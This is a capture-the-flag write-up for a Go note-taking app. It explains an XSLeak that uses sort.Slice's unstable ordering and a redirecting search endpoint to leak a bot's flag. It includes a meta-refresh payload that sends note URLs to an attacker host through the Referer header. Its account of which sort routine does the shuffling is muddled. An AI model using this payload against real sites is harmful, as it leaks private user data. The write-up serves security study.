### Description:

This challenge introduces a new XSLeak technique inspired by SECCON CTF 2023 qualifiers. It involves exploiting the `sort.Slice` function, which behaves unstably during sorting. By leveraging this "unstable sort" behavior, participants can obtain an oracle to leak the flag stored in the bot note using CSRF and this XSLeak technique.

### Objective:

Discover and utilize an XSLeak oracle that can be exploited through the `sort.Slice` function to leak the flag in the bot note.

### Difficulty:

Medium

## Challenge

### The Vulnerability
There's only one vulnerability in this challenge, and it's inside the `utils.go` file. If you check the `getNotesByContent` function, it contains a `sort.Slice` function that sorts your notes by their content.

```go
// Helper function to search user's notes based on the query
func getNotesByContent(username, query string) []TNote {
	var result []TNote
	for _, note := range Notes {
		if note.Username == username && containsIgnoreCase(string(note.Content), query) {
			result = append(result, note)
		}
	}

	sort.Slice(result, func(i, j int) bool {
		return result[i].Content < result[j].Content
	})

	for i, note := range result {
		// secret leak prevention system
		if containsIgnoreCase(string(note.Content), "<!--secret-->") {
			result = append(result[:i], result[i+1:]...)
		}
	}
	return result
}
```
At first glance, it might not seem vulnerable. However, upon examining the `sort.Slice` documentation, we will discover that `sort.Slice` is not guaranteed to be stable.

> The sort is not guaranteed to be stable: equal elements may be reversed from their original order. For a stable sort, use SliceStable.

We'll examine the implementation here: https://github.com/golang/go/blob/c19c4c566c63818dfd059b352e52c4710eecf14d/src/sort/slice.go#L21-L27

```go
func Slice(x any, less func(i, j int) bool) {
	rv := reflectlite.ValueOf(x)
	swap := reflectlite.Swapper(x)
	length := rv.Len()
	limit := bits.Len(uint(length))
	pdqsort_func(lessSwap{less, swap}, 0, length, limit)
}
```
`sort.Slice` will utilize the `pdqsort_func` declared in https://github.com/golang/go/blob/c19c4c566c63818dfd059b352e52c4710eecf14d/src/sort/zsortfunc.go#L61

```go
func pdqsort_func(data lessSwap, a, b, limit int) {
	const maxInsertion = 12

	var (
		wasBalanced    = true // whether the last partitioning was reasonably balanced
		wasPartitioned = true // whether the slice was already partitioned
	)

	for {
		length := b - a

		if length <= maxInsertion {
			insertionSort_func(data, a, b)
			return
		}
        ...snip...
    }
}
```

If the input data exceeds 12 items, `pdqsort_func` will utilize the `insertionSort_func` declared in https://github.com/golang/go/blob/go1.21.0/src/sort/zsortfunc.go#L240-L254

```go
// breakPatterns_func scatters some elements around in an attempt to break some patterns
// that might cause imbalanced partitions in quicksort.
func breakPatterns_func(data lessSwap, a, b int) {
	length := b - a
	if length >= 8 {
		random := xorshift(length)
		modulus := nextPowerOfTwo(length)

		for idx := a + (length/4)*2 - 1; idx <= a+(length/4)*2+1; idx++ {
			other := int(uint(random.Next()) & (modulus - 1))
			if other >= length {
				other -= length
			}
			data.Swap(idx, a+other)
		}
	}
}
```
The `insertionSort_func` will shuffle our data. Exploiting this behavior, consider a scenario where we have 11 or fewer data entries with ID-value pairs. Sorting them by value using `sort.Slice` will correctly sort them by their IDs. However, if we have 12 or more data entries with the same value and sort them using `sort.Slice`, the data will be sorted, but the IDs will be shuffled.

You can confirm this behavior by checking the proof of concept (PoC) provided by `arkark` [here](https://blog.arkark.dev/2023/09/21/seccon-quals/#:~:text=Let%27s%20confirm%20the%20behavior%3A).

```go
package main

import (
	"fmt"
	"sort"
)

type Note struct {
	ID      int
	Content string
}

func test_sort(length int) {
	notes := make([]Note, 0, length)
	notes = append(notes, Note{ID: -1, Content: "x"})
	for i := 0; i < length-1; i++ {
		notes = append(notes, Note{ID: i, Content: "test"})
	}
	// assert: len(notes) == length

	sort.Slice(notes, func(i, j int) bool {
		return notes[i].Content < notes[j].Content
	})

	fmt.Println("length:", length)
	fmt.Println(notes)
}

func main() {
	// Case 1:
	test_sort(11)
	test_sort(12)

	fmt.Println()

	// Case 2:
	test_sort(13)
	test_sort(14)
}
```

output:

```sh
$ go run main.go
length: 11
[{0 test} {1 test} {2 test} {3 test} {4 test} {5 test} {6 test} {7 test} {8 test} {9 test} {-1 x}]
length: 12
[{0 test} {1 test} {2 test} {3 test} {4 test} {5 test} {6 test} {7 test} {8 test} {9 test} {10 test} {-1 x}]

length: 13
[{5 test} {0 test} {1 test} {2 test} {3 test} {4 test} {6 test} {7 test} {8 test} {9 test} {10 test} {11 test} {-1 x}]
length: 14
[{5 test} {7 test} {1 test} {2 test} {3 test} {4 test} {0 test} {12 test} {9 test} {8 test} {6 test} {10 test} {11 test} {-1 x}]
```

### How To Exploit?

To understand how to exploit this vulnerability, we need to know where the `getNotesByContent` function will be called. The `getNotesByContent` function is called in the `/search-notes` endpoint. Here's the code for that endpoint:

```go
func searchNotes(c *gin.Context) {
	username := getUsernameFromContext(c) // Get the username from the context

	// Retrieve the search query from the URL query parameters
	query := c.Query("query")

	if strings.HasPrefix(query, "view:") {
		query = query[5:]
		userNotes := getNotesByContent(username, query)

		if len(userNotes) == 0 {
			c.HTML(http.StatusOK, "search-results.html", gin.H{
				"Query": query,
				"Notes": userNotes,
			})
			return
		}

		c.Redirect(http.StatusSeeOther, "/note/"+userNotes[0].ID)
		return
	}
	// Search user's notes for the given query
	userNotes := getNotesByContent(username, query)

	c.HTML(http.StatusOK, "search-results.html", gin.H{
		"Query": query,
		"Notes": userNotes,
	})
}
```

The endpoint has two possible outputs. If you prepend `view:` to the query, it redirects to the first note of the `getNotesByContent` output. Otherwise, if you search normally, it outputs the list of notes from the `getNotesByContent` function.

Exploiting the `sort.Slice` vulnerability, we can leverage this redirect to our advantage.We'll leak the URL using a meta tag technique, like this:

```html
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Refresh" content="0; URL=http://attacker.example.com">
```

To exploit this vulnerability, we begin by creating 11 notes. Then, we use a meta tag technique payload that we appended to the notes to retrieve the ID of the first note. By appending the meta tag payload and using `view:` followed by the value of the first note, we're redirected to its ID. Upon visiting it, we're redirected to the attacker's website with the Referer header containing the URL with the ID of our first note.

Once we have the ID of the first note, we query for a string matching the flag. This action makes a total of 12 notes if the needle of the flag matched with our query, which triggers the `insertionSort_func`. This shuffles the ID of the first note with another ID sharing the same value if our query matches the flag. If the flag isn't found, shuffling won't occur.

In conclusion, we compare the ID of the first note before it's matched with the flag to the ID after our query matches the flag. If they differ, our query contains the flag.

## Solver

You can find the solver materials in this directory.
